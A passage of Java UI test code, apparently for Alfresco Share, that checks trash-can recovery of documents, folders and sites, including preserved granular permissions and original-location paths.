     * <li>Recover the document</li>
     * <li>Verify the Granular Permissions for the document</li>
     * <li>The specified permissions are set. user are present and have the correct roles</li>
     * <li>Login as user2 and verify the permissions to the document</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14194() throws Exception
    {
        String testName = getTestName();
        String testUser1 = getUserNameFreeDomain(testName + "user1" + System.currentTimeMillis());
        String testUser2 = getUserNameFreeDomain(testName + "user2" + System.currentTimeMillis());
        String siteName1 = getSiteName(testName) + "-1" + System.currentTimeMillis();

        String fileName1 = "fi1-" + getFileName(testName) + System.currentTimeMillis() + ".txt";

        // Any three users are created, e.g. user1, user2
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser1);
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser2);

        // Any user is logged in the Share, e.g. user1
        ShareUser.login(drone, testUser1, DEFAULT_PASSWORD);

        // Any site is created
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();

        webDriverWait(drone, 3000);

        // The user, e.g. user2, is invited to the site with any role, e.g Consumer
        ShareUserMembers.inviteUserToSiteWithRole(drone, testUser1, testUser2, siteName1, UserRole.CONTRIBUTOR);

        ShareUser.logout(drone);

        ShareUser.login(drone, testUser1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        // Any document is uploaded to the site's Document Library
        DocumentLibraryPage docLibPage;
        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        // Manage Permissions page is opened for the created document
        ShareUser.returnManagePermissionPage(drone, fileName1);

        // Add the created in the pre-condition user, e.g. user2
        // Set any permissions level to the user, e.g. Collaborator
        ShareUserMembers.addUserOrGroupIntoInheritedPermissions(drone, testUser2, true, UserRole.COLLABORATOR, false);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        // Delete the document.
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.deleteSelectedContent(drone);

        ShareUserProfile.navigateToTrashCan(drone);

        // Recover the document
        ShareUserProfile.recoverTrashCanItem(drone, fileName1);

        // Verify the Granular Permissions for the document
        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ManagePermissionsPage permissionPage = ShareUser.returnManagePermissionPage(drone, fileName1);

        // The specified permissions are set. user are present and have the correct roles
        Assert.assertEquals(UserRole.COLLABORATOR, permissionPage.getExistingPermission(testUser2),
                "The specified permissions aren't set or user aren't present");

        ShareUser.logout(drone);

        // Login as user2 and verify the permissions to the document
        ShareUser.login(drone, testUser2, DEFAULT_PASSWORD);

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        // The user has Collaborator permissions to the document
        // (Edit Properties, Upload New version, Inline Edit, Offline Edit actions are available)
        Assert.assertTrue(docLibPage.getFileDirectoryInfo(fileName1).isInlineEditLinkPresent(), "Inline Edit link isn't present");
        Assert.assertTrue(docLibPage.getFileDirectoryInfo(fileName1).isEditPropertiesLinkPresent(), "Edit Properties link isn't present");
        Assert.assertTrue(docLibPage.getFileDirectoryInfo(fileName1).isEditOfflineLinkPresent(), "Offline Edit link isn't present");

        ShareUser.logout(drone);
    }

    /**
     * Test - AONE-14195:Recover a folder with Granular Permissions applied
     * <ul>
     * <li>Any three users are created, e.g. user1, user2</li>
     * <li>Any user is logged in the Share, e.g. user1</li>
     * <li>Any site is created</li>
     * <li>Any folder is created in the site's Document Library</li>
     * <li>Manage Permissions page is opened for the created document</li>
     * <li>Add the created in the pre-condition user, e.g. user2/li>
     * <li>Set any permissions level to the user, e.g. Collaborator</li>
     * <li>Delete the document</li>
     * <li>Recover the document</li>
     * <li>Verify the Granular Permissions for the folder</li>
     * <li>The specified permissions are set. user are present and have the correct roles</li>
     * <li>Login as user2 and verify the permissions to the folder</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14195() throws Exception
    {

        String testName = getTestName();

        String testUser1 = getUserNameFreeDomain(testName + "user1" + System.currentTimeMillis());
        String testUser2 = getUserNameFreeDomain(testName + "user2" + System.currentTimeMillis());

        String siteName1 = getSiteName(testName) + System.currentTimeMillis();
        String folderName = getFolderName(testName) + System.currentTimeMillis();

        // Any three users are created, e.g. user1, user2
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser1);
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser2);

        // Any user is logged in the Share, e.g. user1
        ShareUser.login(drone, testUser1, DEFAULT_PASSWORD);

        // Any site is created
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();

        webDriverWait(drone, 3000);

        // Add the created in the pre-condition user, e.g. user2
        ShareUserMembers.inviteUserToSiteWithRole(drone, testUser1, testUser2, siteName1, UserRole.CONTRIBUTOR);

        ShareUser.logout(drone);

        ShareUser.login(drone, testUser1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        // Any folder is created in the site's Document Library
        ShareUserSitePage.createFolder(drone, folderName, folderName);

        ShareUserSitePage.manageContentPermissions(drone, folderName);

        // Set any permissions level to the user, e.g. Collaborator
        ShareUserMembers.addUserOrGroupIntoInheritedPermissions(drone, testUser2, true, UserRole.COLLABORATOR, true);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.selectContentCheckBox(drone, folderName);

        // Delete the document
        ShareUser.deleteSelectedContent(drone);

        ShareUserProfile.navigateToTrashCan(drone);

        // Recover the document
        ShareUserProfile.recoverTrashCanItem(drone, folderName);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ManagePermissionsPage permissionPage = ShareUserSitePage.manageContentPermissions(drone, folderName);

        // Verify the Granular Permissions for the folder
        Assert.assertEquals(UserRole.COLLABORATOR, permissionPage.getExistingPermission(testUser2),
                "The specified permissions aren't set or user aren't present");

        ShareUser.logout(drone);

        // Login as user2 and verify the permissions to the folder
        ShareUser.login(drone, testUser2, DEFAULT_PASSWORD);

        DocumentLibraryPage docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertTrue(docLibPage.getFileDirectoryInfo(folderName).isEditPropertiesLinkPresent(), "Edit Properties link isn't presented");

        ShareUser.logout(drone);
    }

    /**
     * Test - AONE-14196:Verify deleted site info. Recover/Delete the site
     * <ul>
     * <li>Any user is logged in the Share</li>
     * <li>Any site is created</li>
     * <li>Several content items were created and deleted by user</li>
     * <li>Verify the list of available items</li>
     * <li>Recover the site</li>
     * <li>Verify the recovered site</li>
     * <li>Verify the content items</li>
     * <li>Delete the site again</li>
     * <li>Delete the site from Trashcan</li>
     * <li>The site cannot be opened. It is absent in the repository</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14196() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameFreeDomain(testName + System.currentTimeMillis());
        String siteName1 = getSiteName(testName) + System.currentTimeMillis();

        String folder = getFolderName(testName) + System.currentTimeMillis();
        String fileName = getFileName(testName) + System.currentTimeMillis();
        String commentForFile = "Whats up " + folder + ", How you doing?";
        String commentForFolder = "Whats up " + fileName + ", How you doing?";
        String format = "EEE d MMM YYYY";

        // Any user is logged in the Share
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser);

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        // Any site is created
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        // Several content items were created and deleted by user
        ShareUser.uploadFileInFolder(drone, new String[] { fileName, DOCLIB });

        DocumentLibraryPage docLibPage;
        ShareUserSitePage.createFolder(drone, folder, folder);

        ShareUserSitePage.addComment(drone, fileName, commentForFile);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUserSitePage.addComment(drone, folder, commentForFolder);

        // Several content items were created and deleted by user
        SiteUtil.deleteSite(drone, siteName1);

        String dateOfSiteDeletaion = ShareUser.getDate(format);

        ShareUserProfile.navigateToTrashCan(drone);

        // Verify the list of available items
        TrashCanItem trashCanItem = ShareUserProfile.getTrashCanItem(drone, siteName1);

        Assert.assertTrue(trashCanItem.getDate().contains(dateOfSiteDeletaion), "Deleted on {date} by {user}', original path");
        Assert.assertTrue(trashCanItem.getUserFullName().contains(trashcanUser), "Deleted on {date} by {user}', original path");

        // Recover the site
        ShareUserProfile.recoverTrashCanItem(drone, siteName1);

        // Verify the recovered site
        docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(drone, siteName1);

        // Verify the content items
        Assert.assertTrue(docLibPage.isFileVisible(fileName), "File " + fileName + " isn't presented in Doc Lib");

        DocumentDetailsPage docDetailsPage = docLibPage.selectFile(fileName).render();

        Assert.assertTrue(docDetailsPage.getComments().contains(commentForFile), "Comment for file " + fileName + " isn't presented");

        docLibPage = ShareUser.openDocumentLibrary(drone);

        Assert.assertTrue(docLibPage.isFileVisible(folder), "Folder " + folder + " isn't presented in Doc Lib");

        FolderDetailsPage folderDetailsPage = docLibPage.getFileDirectoryInfo(folder).selectViewFolderDetails().render();

        Assert.assertTrue(folderDetailsPage.getComments().contains(commentForFolder), "Comment for folder " + folder + " isn't presented");

        // Delete the site again
        SiteUtil.deleteSite(drone, siteName1);

        ShareUserProfile.navigateToTrashCan(drone);

        // Delete the site from Trashcan
        ShareUserProfile.deleteTrashCanItem(drone, siteName1);

        // The site cannot be opened. It is absent in the repository
        Assert.assertFalse(SiteUtil.searchSiteWithRetry(drone, siteName1, false).getSiteList().contains(siteName1), "The site is present in the repository");
    }

    /**
     * Test - AONE-14197:Paths to the deleted item's original location
     * <ul>
     * <li>Any user is logged in the Share</li>
     * <li>Any site is created</li>
     * <li>Any content item is created by user, e.g. a document test1.txt, in the site</li>
     * <li>The content item is deleted</li>
     * <li>Delete the site created in pre-conditions.</li>
     * <li>Click 'Recover' button for test1.txt</li>
     * <li>Recover the site</li>
     * <li>Verify the path to the test1.txt original location</li>
     * <li>Recover test1.txt.</li>
     * <li>The content item is recovered successfully</li>
     * </ul>
     * 
     * @throws Exception
     */
    @Test(groups = "AlfrescoOne", timeOut = 400000)
    public void AONE_14197() throws Exception
    {

        String testName = getTestName();

        String trashcanUser = getUserNameFreeDomain(testName + "user1" + System.currentTimeMillis());

        String siteName1 = getSiteName(testName) + System.currentTimeMillis();

        String folder = getFolderName(testName) + System.currentTimeMillis();
        String fileName = getFileName(testName) + System.currentTimeMillis();

        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, trashcanUser);

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC).render();

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        // Any content item is created by user, e.g. a document test1.txt, in the site
        ShareUser.uploadFileInFolder(drone, new String[] { fileName });

        DocumentLibraryPage docLibPage;
        ShareUserSitePage.createFolder(drone, folder, folder);

        // The content item is deleted
        ShareUser.selectContentCheckBox(drone, folder);
        ShareUser.selectContentCheckBox(drone, fileName);
        ShareUser.deleteSelectedContent(drone);

        // Delete the site created in pre-conditions.
        SiteUtil.deleteSite(drone, siteName1);

        ShareUserProfile.navigateToTrashCan(drone);

        // Click 'Recover' button for test1.txt
        try
        {
            ShareUserProfile.recoverTrashCanItem(drone, fileName).render();
            Assert.fail("Expected error: Failed to recover: is not displayed");
        }
        catch (ShareException se)
        {
            // Continue On Expected Exception
            Assert.assertTrue(("Failed to recover").equalsIgnoreCase(se.getMessage()));
        }

        Assert.assertTrue(StringUtils.isEmpty(ShareUserProfile.getTrashCanItem(drone, folder).getFolderPath()), "Original path is displayed.");

        // Recover the site
        ShareUserProfile.recoverTrashCanItem(drone, siteName1);

        Assert.assertTrue(ShareUserProfile.getTrashCanItem(drone, folder).getFolderPath().endsWith(DOCLIB_CONTAINER),
                "Original path is now displayed correctly.");

        // Recover test1.txt.
        ShareUserProfile.recoverTrashCanItem(drone, fileName);

        ShareUserProfile.recoverTrashCanItem(drone, folder);

        // The content item is recovered successfully
        docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(drone, siteName1);

        Assert.assertTrue(docLibPage.isFileVisible(fileName), "File " + fileName + " isn't presented in Doc Lib");
        Assert.assertTrue(docLibPage.isFileVisible(folder), "Folder " + folder + " isn't presented in Doc Lib");
    }

}
